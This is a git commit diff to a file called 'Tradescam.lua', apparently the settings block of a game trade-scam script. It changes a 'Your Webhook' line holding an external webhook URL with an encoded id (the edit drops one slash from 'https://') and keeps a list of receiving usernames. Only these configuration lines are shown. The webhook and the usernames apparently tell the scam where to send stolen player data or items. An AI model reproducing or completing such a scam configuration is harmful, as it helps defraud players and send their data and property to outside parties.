47bb2b581cce28b160dbee51ce64af7cb425c6f4
realredzhubv2 <abhichand2344@gmail.com>
2025-03-27 01:11:01 +0530

    Update Tradescam.lua

--- Tradescam.lua
+++ Tradescam.lua
@@ -1,4 +1,4 @@
-Webhook = ""https://webhook-protect.vercel.app/api/webhook?id=WmtxS3Mybl9FY2lfOFBwWmQtdXlFdzpud1VOeU05c3h1dUZaRm5Hd0lJc2JXN0VSc1Z5bldxR3M0R2lzczA0Q0lQckVPQm1tMEgyNUo0bWxOUWVwLUs1dkwtQXpIN3VBX3l6TkE5VWo1ajFFcGtHcGlxRHo0eWtIN2MzT2FFakxxZkFOME5XQ09EdTBXYTZ2SzNxcDNJdF80MG9HNFpwZHFBV0JTSmc5MTBPNURKNnlsaGZVQWVPTVRWOXNUSjZsYXM"" << Your Webhook
+Webhook = ""https:/webhook-protect.vercel.app/api/webhook?id=WmtxS3Mybl9FY2lfOFBwWmQtdXlFdzpud1VOeU05c3h1dUZaRm5Hd0lJc2JXN0VSc1Z5bldxR3M0R2lzczA0Q0lQckVPQm1tMEgyNUo0bWxOUWVwLUs1dkwtQXpIN3VBX3l6TkE5VWo1ajFFcGtHcGlxRHo0eWtIN2MzT2FFakxxZkFOME5XQ09EdTBXYTZ2SzNxcDNJdF80MG9HNFpwZHFBV0JTSmc5MTBPNURKNnlsaGZVQWVPTVRWOXNUSjZsYXM"" << Your Webhook
 
 Usernames = {"56devili", "9DEAD_LIGHT"} username(-s). << Your
 
